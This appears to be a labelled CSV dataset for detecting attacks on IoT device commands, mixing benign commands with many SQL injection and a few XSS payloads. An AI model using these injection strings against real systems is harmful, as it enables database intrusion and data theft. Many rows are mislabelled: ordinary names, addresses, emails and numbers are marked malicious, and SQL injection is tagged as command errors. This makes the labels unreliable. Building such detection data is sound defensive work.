payload,label,attack_type
sant lloren des cardassar,malicious,cmd_parse_error
"run_cmd, ADD 145 238",benign,norm
"c/ la pinta, 158 9?d",malicious,cmd_parse_error
watanabe,malicious,cmd_parse_error
"run_cmd, echo ['mqtt']",benign,norm
natal,malicious,cmd_parse_error
de_anda,malicious,cmd_parse_error
"run_cmd, echo ['sensor', 'normal', 'safe']",benign,norm
"run_cmd, ADD 400 425",benign,norm
"run_cmd, ADD 477 347",benign,norm
0680099679266442,malicious,cmd_parse_error
"start_temp_report, 37",benign,norm
69409914p,malicious,cmd_parse_error
westermeier,malicious,cmd_parse_error
"start_temp_report, 103",benign,norm
cecile,malicious,cmd_parse_error
"start_temp_report, 111",benign,norm
"start_temp_report, 4",benign,norm
"start_temp_report, 110",benign,norm
roi,malicious,cmd_parse_error
"run_cmd, ADD 83 707",benign,norm
recelosa,malicious,cmd_parse_error
"1""))) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (((""jgoq""=""jgoq",malicious,cmd_parse_error
"start_temp_report, 32",benign,norm
"start_temp_report, 20",benign,norm
"1 where 1842=1842 or 8514=benchmark(5000000,md5(0x544d5a4c))#",malicious,cmd_parse_error
"start_temp_report, 119",benign,norm
"run_cmd, echo ['ok', 'system', 'world']",benign,norm
"start_temp_report, 19",benign,norm
"echo, ['mqtt', 'system', 'ping', 'hello']",benign,norm
"start_temp_report, 49",benign,norm
1) where 1333=1333 order by 1--,malicious,cmd_parse_error
22311,malicious,cmd_parse_error
"echo, ['iot']",benign,norm
"1"";select benchmark(5000000,md5(0x4c4d6142)) and ""azzv"" like ""azzv",malicious,cmdi
"run_cmd, echo ['iot', 'mqtt']",benign,norm
"1%"")) waitfor delay '0:0:5'--",malicious,cmd_parse_error
2306,malicious,cmd_parse_error
"run_cmd, echo ['ready', 'mqtt']",benign,norm
haim.gorvin@didacramirez.tl,malicious,cmd_parse_error
"1%""))) and 1594=8757",malicious,cmd_parse_error
praxila,malicious,cmd_parse_error
"echo, ['report', 'world', 'sensor', 'data']",benign,norm
llull valls,malicious,cmd_parse_error
"run_cmd, echo ['report', 'ready', 'sensor', 'ok']",benign,norm
"run_cmd, ADD 816 969",benign,norm
"start_temp_report, 21",benign,norm
leoine,malicious,cmd_parse_error
"echo, ['normal', 'ping']",benign,norm
"run_cmd, echo ['status', 'data', 'ok', 'ping']",benign,norm
patchit,malicious,cmd_parse_error
"run_cmd, echo ['esp32', 'ok']",benign,norm
"1"" or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))",malicious,cmd_parse_error
"run_cmd, ADD 36 117",benign,norm
"echo, ['report', 'ok', 'device', 'iot']",benign,norm
"run_cmd, echo ['normal', 'data', 'safe', 'ready']",benign,norm
"run_cmd, ADD 687 534",benign,norm
"1 where 6077=6077 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",malicious,cmdi
"1%"")) rlike (select * from (select(sleep(5)))vwyq)#",malicious,cmd_parse_error
1) and 7533=7533,malicious,cmd_parse_error
"start_temp_report, 17",benign,norm
mullor campllonch,malicious,cmd_parse_error
hasty,malicious,cmd_parse_error
"run_cmd, ADD 257 811",benign,norm
"1%');select benchmark(5000000,md5(0x714e4153))#",malicious,cmdi
"start_temp_report, 15",benign,norm
"run_cmd, echo ['sensor', 'ping', 'device']",benign,norm
villaeles de valdavia,malicious,cmd_parse_error
"run_cmd, echo ['device', 'data', 'report', 'system']",benign,norm
"run_cmd, echo ['data', 'payload', 'ok']",benign,norm
"plza. fuentes claras, 74",malicious,cmd_parse_error
cibeles,malicious,cmd_parse_error
"start_temp_report, 112",benign,norm
"run_cmd, ADD 281 803",benign,norm
"run_cmd, ADD 796 270",benign,norm
"1"") as ivkw where 4218=4218 union all select null--",malicious,cmd_parse_error
"-2625"")) as qfuo where 1980=1980 union all select 1980,1980,1980--",malicious,cmd_parse_error
"iif(3204=8489,3204,1/0)",malicious,cmd_parse_error
"run_cmd, ADD 35 318",benign,norm
3363230401310436,malicious,cmd_parse_error
magriny,malicious,cmd_parse_error
1' in boolean mode);select (case when (8711=6432) then 1 else 8711*(select 8711 from master..sysdatabases) end)--,malicious,cmdi
"run_cmd, ADD 440 243",benign,norm
elias pallares,malicious,cmd_parse_error
"start_temp_report, 12",benign,norm
"run_cmd, ADD 250 210",benign,norm
tempest@quadernideilgarda.gg,malicious,cmd_parse_error
1)) or 6793=(select 6793 from pg_sleep(5)) and ((3069=3069,malicious,cmd_parse_error
"run_cmd, echo ['status', 'iot', 'esp32']",benign,norm
"run_cmd, ADD 731 348",benign,norm
enumer24,malicious,cmd_parse_error
"echo, ['ok', 'esp32', 'data']",benign,norm
0rbul5,malicious,cmd_parse_error
"run_cmd, echo ['world', 'system']",benign,norm
"start_temp_report, 95",benign,norm
"1"") where 8657=8657;select benchmark(5000000,md5(0x714e4153))#",malicious,cmdi
"run_cmd, ADD 845 4",benign,norm
maximiliano,malicious,cmd_parse_error
"run_cmd, ADD 395 998",benign,norm
<!-- -- --><script>alert('xss');</script><!-- -- -->,malicious,xss
"1%')) and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",malicious,cmdi
saetill.a,malicious,cmd_parse_error
asentis21,malicious,cmd_parse_error
"run_cmd, ADD 211 507",benign,norm
alabiada,malicious,cmd_parse_error
1424,malicious,cmd_parse_error
amsterdam@mailboxrussia.nz,malicious,cmd_parse_error
"echo, ['system']",benign,norm
3946406903398216,malicious,cmd_parse_error
"1"") where 1416=1416 union all select null,null,null#",malicious,cmd_parse_error
19244,malicious,cmd_parse_error
fabiela,malicious,cmd_parse_error
"start_temp_report, 48",benign,norm
"<img src=""livescript:document.cookie=true;"">",malicious,xss
"run_cmd, ADD 972 375",benign,norm
"1"") where 6809=6809 rlike (select * from (select(sleep(5)))sgvo)--",malicious,cmd_parse_error
"echo, ['data', 'ping', 'sensor']",benign,norm
"1' and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and 'rtbm'='rtbm",malicious,cmd_parse_error
'true',malicious,cmd_parse_error
vallabri visglerio,malicious,cmd_parse_error
"-6389"" union all select 2355,2355,2355,2355,2355--",malicious,cmd_parse_error
"run_cmd, echo ['ok', 'esp32', 'hello']",benign,norm
"run_cmd, echo ['esp32', 'device']",benign,norm
"run_cmd, ADD 773 961",benign,norm
"1') as ybuv where 9641=9641 union all select null,null,null,null,null,null,null,null--",malicious,cmd_parse_error
"echo, ['sensor', 'report']",benign,norm
"start_temp_report, 10",benign,norm
"start_temp_report, 69",benign,norm
"run_cmd, echo ['payload', 'world', 'ready', 'iot']",benign,norm
"run_cmd, echo ['ready']",benign,norm
"run_cmd, ADD 108 891",benign,norm
guntekin,malicious,cmd_parse_error
3a2rimo19,malicious,cmd_parse_error
"run_cmd, echo ['data', 'payload', 'report']",benign,norm
"echo, ['esp32', 'normal']",benign,norm
"start_temp_report, 76",benign,norm
08zaril0o,malicious,cmd_parse_error
"run_cmd, ADD 38 921",benign,norm
9678,malicious,cmd_parse_error
34853143r,malicious,cmd_parse_error
"start_temp_report, 8",benign,norm
64446970g,malicious,cmd_parse_error
"1' and elt(9371=8882,8882) and 'vurh'='vurh",malicious,cmd_parse_error
"start_temp_report, 30",benign,norm
"echo, ['iot', 'device', 'safe', 'status']",benign,norm
tarrats steiert,malicious,cmd_parse_error
"once paradas, 139",malicious,cmd_parse_error
9366583302251207,malicious,cmd_parse_error
"echo, ['safe', 'report']",benign,norm
"start_temp_report, 21",benign,norm
"1'+(select 'fpnz' where 1592=1592 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a))+'",malicious,cmd_parse_error
"run_cmd, echo ['status', 'world', 'data', 'sensor']",benign,norm
"start_temp_report, 25",benign,norm
"start_temp_report, 102",benign,norm
"start_temp_report, 15",benign,norm
"start_temp_report, 14",benign,norm
"echo, ['normal', 'report', 'sensor', 'esp32']",benign,norm
"1'||(select 'ypil' from dual where 4568=4568 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4))||'",malicious,cmdi
donnerstag_carraro@hojainformativa.sv,malicious,cmd_parse_error
"run_cmd, echo ['ping', 'status', 'sensor']",benign,norm
"start_temp_report, 2",benign,norm
"start_temp_report, 31",benign,norm
"echo, ['esp32']",benign,norm
1))) rlike (select (case when (4367=6879) then 1 else 0x28 end)) and (((2542=2542,malicious,cmd_parse_error
"-9656"" union all select 8735,8735--",malicious,cmd_parse_error
navarrevisca,malicious,cmd_parse_error
1'))) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ((('cbnc' like 'cbnc,malicious,cmdi
95726092t,malicious,cmd_parse_error
"run_cmd, ADD 646 288",benign,norm
protectorio,malicious,cmd_parse_error
"start_temp_report, 100",benign,norm
"echo, ['status']",benign,norm
"1 where 8398=8398;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",malicious,cmdi
"echo, ['system', 'status', 'ready']",benign,norm
"run_cmd, echo ['safe', 'system', 'data']",benign,norm
decimon4na,malicious,cmd_parse_error
"echo, ['ok', 'system', 'hello', 'report']",benign,norm
"aljaraque 196, 11d",malicious,cmd_parse_error
1') as qcse where 4147=4147 waitfor delay '0:0:5'--,malicious,cmd_parse_error
"echo, ['ready', 'iot']",benign,norm
"1""))) and (3020=3020)*6703 and (((""fqap"" like ""fqap",malicious,cmd_parse_error
"run_cmd, echo ['normal', 'ready', 'system', 'report']",benign,norm
"start_temp_report, 119",benign,norm
7r6d54ti450,malicious,cmd_parse_error
1 where 1636=1636 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')--,malicious,cmdi
"c/ 19 s/n, 9e",malicious,cmd_parse_error
gallinero de cameros,malicious,cmd_parse_error
"start_temp_report, 65",benign,norm
"run_cmd, echo ['payload', 'safe', 'device', 'system']",benign,norm
"run_cmd, echo ['ping', 'status']",benign,norm
"1%"" union all select null,null,null,null--",malicious,cmd_parse_error
"run_cmd, echo ['device', 'report', 'normal']",benign,norm
kazuo,malicious,cmd_parse_error
"run_cmd, ADD 659 912",benign,norm
"start_temp_report, 115",benign,norm
43427,malicious,cmd_parse_error
20001,malicious,cmd_parse_error
"run_cmd, echo ['status', 'system']",benign,norm
3o22ciabl3,malicious,cmd_parse_error
9999685362950353,malicious,cmd_parse_error
5170844676174994,malicious,cmd_parse_error
"echo, ['esp32', 'mqtt', 'system', 'ping']",benign,norm
"1')) as tfub where 3461=3461 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",malicious,cmdi
"1"") or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (""fbqy"" like ""fbqy",malicious,cmd_parse_error
"1%"")) and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",malicious,cmd_parse_error
"start_temp_report, 17",benign,norm
"run_cmd, echo ['ping', 'iot']",benign,norm
"start_temp_report, 45",benign,norm
zohreh,malicious,cmd_parse_error
"run_cmd, ADD 396 725",benign,norm
"1) as zodp where 9112=9112;select count(*) from generate_series(1,5000000)--",malicious,cmdi
"run_cmd, echo ['esp32', 'ok', 'normal', 'report']",benign,norm
luena,malicious,cmd_parse_error
pel3sg9,malicious,cmd_parse_error
pridiliano,malicious,cmd_parse_error
cuevas labradas,malicious,cmd_parse_error
7360017663684858,malicious,cmd_parse_error
"start_temp_report, 90",benign,norm
"run_cmd, echo ['system', 'safe', 'normal', 'report']",benign,norm
"start_temp_report, 97",benign,norm
"1'));select count(*) from generate_series(1,5000000)--",malicious,cmdi
"ginebrosa, la",malicious,cmd_parse_error
"run_cmd, echo ['data', 'sensor']",benign,norm
pool echenique,malicious,cmd_parse_error
"1"" where 5328=5328 and 2388=benchmark(5000000,md5(0x6d457153))#",malicious,cmd_parse_error
saint-simon-vondis@paremoselalzheimer.dj,malicious,cmd_parse_error
"run_cmd, echo ['payload']",benign,norm
"1'||(select 'ywjy' where 7579=7579;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,cmdi
8on5fi4a,malicious,cmd_parse_error
"1')) as orvy where 7270=7270 union all select null,null,null,null,null,null,null,null#",malicious,cmd_parse_error
"start_temp_report, 3",benign,norm
exageracin,malicious,cmd_parse_error
"run_cmd, echo ['safe']",benign,norm
"start_temp_report, 73",benign,norm
"start_temp_report, 108",benign,norm
"start_temp_report, 16",benign,norm
"calle pianista berdion, s/n, 13?g",malicious,cmd_parse_error
1' and 2908=8067--,malicious,cmd_parse_error
"run_cmd, ADD 37 462",benign,norm
viana,malicious,cmd_parse_error
"run_cmd, ADD 847 603",benign,norm
"echo, ['hello', 'safe', 'report']",benign,norm
-6203'))) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('luee'='luee,malicious,cmdi
"-5165')) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('zpnv' like 'zpnv",malicious,cmd_parse_error
"1%""))) or 6793=(select 6793 from pg_sleep(5)) and (((""%""=""",malicious,cmd_parse_error
18301326l,malicious,cmd_parse_error
"1%"")));select count(*) from generate_series(1,5000000) and (((""%""=""",malicious,cmdi
"1"") where 7919=7919 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,cmdi
9269450355652252,malicious,cmd_parse_error
"run_cmd, ADD 126 856",benign,norm
"run_cmd, ADD 984 593",benign,norm
"start_temp_report, 98",benign,norm
"run_cmd, ADD 59 342",benign,norm
"run_cmd, ADD 881 297",benign,norm
1) or sleep(5)#,malicious,cmd_parse_error
31439,malicious,cmd_parse_error
7387,malicious,cmd_parse_error
26340,malicious,cmd_parse_error
eliseo,malicious,cmd_parse_error
pa,malicious,cmd_parse_error
"echo, ['data', 'ok', 'sensor']",benign,norm
43273596q,malicious,cmd_parse_error
07461641g,malicious,cmd_parse_error
"run_cmd, ADD 215 870",benign,norm
plmaces de jadraque,malicious,cmd_parse_error
de la cerda gassol,malicious,cmd_parse_error
"1%') and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ('%'='",malicious,cmdi
"run_cmd, echo ['status', 'ready', 'system']",benign,norm
"run_cmd, ADD 839 712",benign,norm
"run_cmd, ADD 102 362",benign,norm
1)) as sfan where 7176=7176 and 7017=7358,malicious,cmd_parse_error
"-6680""))) union all select 2564,2564,2564,2564,2564,2564#",malicious,cmd_parse_error
"echo, ['status', 'ready']",benign,norm
"echo, ['hello', 'status', 'safe']",benign,norm
"1"") as paai where 4089=4089 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",malicious,cmd_parse_error
"1) where 6304=6304;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,cmdi
"run_cmd, ADD 258 817",benign,norm
"start_temp_report, 59",benign,norm
"start_temp_report, 103",benign,norm
"echo, ['normal', 'safe']",benign,norm
"1'))) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and ((('dzzx'='dzzx",malicious,cmd_parse_error
"start_temp_report, 115",benign,norm
ejarque barbieri,malicious,cmd_parse_error
"start_temp_report, 110",benign,norm
naut aran,malicious,cmd_parse_error
"start_temp_report, 42",benign,norm
klee8@farma-job.fj,malicious,cmd_parse_error
"start_temp_report, 86",benign,norm
"aguila s/n, 6-g",malicious,cmd_parse_error
"run_cmd, ADD 934 138",benign,norm
"1') or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ('yabn'='yabn",malicious,cmd_parse_error
"1))) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,cmd_parse_error
"start_temp_report, 114",benign,norm
"echo, ['device']",benign,norm
"1' and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and 'dphz'='dphz",malicious,cmdi
"start_temp_report, 47",benign,norm
aylmar6,malicious,cmd_parse_error
raphael_eichorn@lesionesmusculares.et,malicious,cmd_parse_error
"run_cmd, echo ['device', 'world', 'safe', 'data']",benign,norm
sheree,malicious,cmd_parse_error
"-5571' union all select 8846,8846,8846,8846,8846,8846,8846#",malicious,cmd_parse_error
"run_cmd, ADD 115 678",benign,norm
tito,malicious,cmd_parse_error
1)));if(7899=7899) select 7899 else drop function zbbp--,malicious,cmdi
"calle pintor julian alcaraz, 108, 10-a",malicious,cmd_parse_error
joan de joanes 61 3?h,malicious,cmd_parse_error
"run_cmd, echo ['status', 'safe', 'sensor', 'hello']",benign,norm
poshiu,malicious,cmd_parse_error
"1 where 6369=6369 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)--",malicious,cmd_parse_error
"echo, ['status', 'ok', 'sensor', 'hello']",benign,norm
"run_cmd, echo ['ready']",benign,norm
"start_temp_report, 95",benign,norm
"echo, ['report', 'ping', 'world']",benign,norm
"run_cmd, ADD 864 556",benign,norm
"espinar, el",malicious,cmd_parse_error
"start_temp_report, 17",benign,norm
mazuela,malicious,cmd_parse_error
"start_temp_report, 86",benign,norm
1' or 4240=(select 4240 from pg_sleep(5))--,malicious,cmd_parse_error
!p3rader9,malicious,cmd_parse_error
"echo, ['ping']",benign,norm
1'+(select dpkp where 4836=4836 and sleep(5))+',malicious,cmd_parse_error
"echo, ['ok', 'system', 'sensor', 'world']",benign,norm
4354c07a,malicious,cmd_parse_error
7677,malicious,cmd_parse_error
arabella,malicious,cmd_parse_error
703,malicious,cmd_parse_error
"run_cmd, echo ['ping', 'data']",benign,norm
5405560424744158,malicious,cmd_parse_error
"start_temp_report, 86",benign,norm
espnola claudio,malicious,cmd_parse_error
"run_cmd, echo ['ping', 'ready', 'normal']",benign,norm
"echo, ['data', 'mqtt', 'safe']",benign,norm
cachapera,malicious,cmd_parse_error
"1%')) or elt(5873=5873,sleep(5))#",malicious,cmd_parse_error
